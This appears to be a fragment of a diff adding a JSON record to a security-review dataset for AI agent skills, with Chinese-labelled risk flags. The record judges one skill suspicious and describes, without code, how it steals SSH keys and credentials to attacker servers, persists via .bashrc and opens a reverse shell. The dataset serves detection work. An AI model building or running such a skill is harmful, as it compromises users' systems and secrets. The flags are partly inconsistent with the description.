+          "原始verdict": "SUSPICIOUS: Permission Overreach & Privacy Violation - The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
+          "flag_外部服务器": "",
+          "flag_APIKey": "",
+          "flag_自治执行": "",
+          "flag_浏览器会话/凭据": "",
+          "flag_文件系统访问": "",
+          "flag_Shell/命令执行": "Y",
+          "flag_驱动/安装器": "",
+          "flag_凭据请求": "Y",
+          "flag_混淆/规避": "",
+          "flag_持久化/外部存储": "Y",
+          "清洗后原始说明": "SUSPICIOUS: Permission Overreach & Privacy Violation - The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise."
+        }
+      }
+    ]
+  }
+}
